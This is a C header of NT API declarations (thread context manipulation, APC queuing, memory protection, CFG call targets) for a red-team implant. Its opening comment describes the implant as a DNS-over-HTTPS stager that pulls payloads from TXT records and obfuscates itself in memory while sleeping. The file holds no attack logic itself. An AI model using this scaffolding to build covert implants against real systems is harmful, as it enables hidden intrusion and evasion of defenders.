/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#ifndef _APIDEF_H_
#define _APIDEF_H_

typedef enum
{
	ProcessCookie = 0x24,
	ProcessUserModeIOPL = 0x10
} PROCESSINFOCLASS;

typedef struct __attribute__((packed))
{
	ULONG					ExtendedProcessInfo;
	ULONG					ExtendedProcessInfoBuffer;
} EXTENDED_PROCESS_INFORMATION, *PEXTENDED_PROCESS_INFORMATION;

typedef struct
{
	union {
		NTSTATUS			Status;
		LPVOID				Pointer;
	} DUMMYUNIONNAME;

	ULONG_PTR 				Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

BOOLEAN
WINAPI
SetProcessValidCallTargets(
	HANDLE					hProcess,
	PVOID					VirtualAddress,
	SIZE_T					RegionSize,
	ULONG					NumberOfOffsets,
	PCFG_CALL_TARGET_INFO 			CfgCallInfo
	);

NTSYSAPI
NTSTATUS
NTAPI
NtSignalAndWaitForSingleObject(
	HANDLE					ObjectToSignal,
	HANDLE					WaitableObject,
	BOOLEAN					Alertable,
	PLARGE_INTEGER				Time
	);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationProcess(
	HANDLE					ProcessHandle,
	PROCESSINFOCLASS			ProcessInfoClass,
	PVOID					ProcessInformation,
	ULONG					ProcessInformationLength,
	PULONG					ReturnLength
	);

NTSYSAPI
NTSTATUS
NTAPI
NtProtectVirtualMemory(
	HANDLE					ProcessHandle,
	PVOID*					BaseAddress,
	PULONG					NumberOfBytesToProtect,
	ULONG					NewAccessProtection,
	PULONG					OldAccessProtection
	);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitForSingleObject(
	HANDLE					Handle,
	BOOLEAN					Alertable,
	PLARGE_INTEGER				TimeOut
	);

NTSYSAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
	HANDLE					FileHandle,
	HANDLE					Event,
	LPVOID					ApcRoutine,
	LPVOID					ApcContext,
	PIO_STATUS_BLOCK			IoStatusBlock,
	ULONG					IoControlCode,
	PVOID					InputBuffer,
	ULONG					InputBufferLength,
	PVOID					OutputBuffer,
	ULONG					OutputBufferLength
	);

NTSYSAPI
NTSTATUS
NTAPI
RtlInitUnicodeString(
	PUNICODE_STRING				DestinationSTring,
	PCWSTR					SourceString
	);

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateUserThread(
	HANDLE					ProcessHandle,
	PSECURITY_DESCRIPTOR			SecurityDescriptor,
	BOOLEAN					CreateSuspended,
	PVOID					StackAddr,
	SIZE_T					StackReserved,
	SIZE_T					StackCommit,
	PVOID					StartAddres,
	PVOID					StartParameter,
	PHANDLE					ThreadHandle,
	PCLIENT_ID				ClientId
	);

NTSYSAPI
NTSTATUS
NTAPI
NtAlertResumeThread(
	HANDLE					ThreadHandle,
	PULONG					SuspendCount
	);

NTSYSAPI
NTSTATUS
NTAPI
NtSetContextThread(
	HANDLE					ThreadHandle,
	PCONTEXT				Context
	);

NTSYSAPI
NTSTATUS
NTAPI
NtGetContextThread(
	HANDLE					ThreadHandle,
	PCONTEXT				Context
	);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateThread(
	HANDLE					ThreadHandle,
	NTSTATUS				ExitStatus
	);

NTSYSAPI
VOID
NTAPI
RtlCaptureContext(
	PCONTEXT				ContextRecord
	);

NTSYSAPI
NTSTATUS
NTAPI
NtDelayExecution(
	BOOLEAN					Alertable,
	PLARGE_INTEGER				DelayInterval
	);

NTSYSAPI
NTSTATUS
NTAPI
NtQueueApcThread(
	HANDLE					ThreadHandle,
	LPVOID					ApcRoutine,
	LPVOID					ApcRoutineContext,
	LPVOID					ApcStatusBlock,
	LPVOID					ApcReserved
	);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateThreadEx(
	PHANDLE					hThread,
	ACCESS_MASK				DesiredAccess,
	PVOID					ObjectAttributes,
	HANDLE					ProcessHandle,
	PVOID					StartAddress,
	PVOID					Parameter,
	BOOL					CreateSuspended,
	SIZE_T					StackZeroBits,
	SIZE_T					SizeOfStackCommit,
	SIZE_T					SizeOfStackReserve,
	PVOID					BytesBuffer
	);

NTSYSAPI
PVOID
NTAPI
RtlAllocateHeap(
	PVOID					HeapHandle,
	ULONG					Flags,
	SIZE_T					Size
	);

NTSYSAPI
NTSTATUS
NTAPI
NtSuspendThread(
	HANDLE					ThreadHandle,
	PULONG					PreviousSuspendCount
	);

NTSYSAPI
NTSTATUS
NTAPI
NtResumeThread(
	HANDLE					ThreadHandle,
	PULONG					PreviousSuspendCount
	);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateEvent(
	PHANDLE					EventHandle,
	ACCESS_MASK				DesiredAccess,
	PVOID					ObjectAttributes,
	ULONG					EventType,
	BOOLEAN					InitialState
	);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThread(
	PHANDLE					ThreadHandle,
	ACCESS_MASK				DesiredAccess,
	PVOID					ObjectAttributes,
	PCLIENT_ID				ClientId
	);

NTSYSAPI
BOOLEAN
NTAPI
RtlFreeHeap(
	PVOID					HeapHandle,
	ULONG					Flags,
	PVOID					BaseAddress
	);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenFile(
	PHANDLE					FileHandle,
	ACCESS_MASK				DesiredAccess,
	OBJECT_ATTRIBUTES*			ObjectAttributes,
	PIO_STATUS_BLOCK			IoStatusBlock,
	ULONG					ShareAccess,
	ULONG					OpenOptions
	);

NTSYSAPI
NTSTATUS
NTAPI
NtTestAlert(
	VOID
	);

NTSYSAPI
NTSTATUS
NTAPI
NtContinue(
	PCONTEXT				ThreadContext,
	BOOLEAN					RaiseAlert
	);

NTSYSAPI
NTSTATUS
NTAPI
NtClose(
	HANDLE					Handle
       );

#endif 
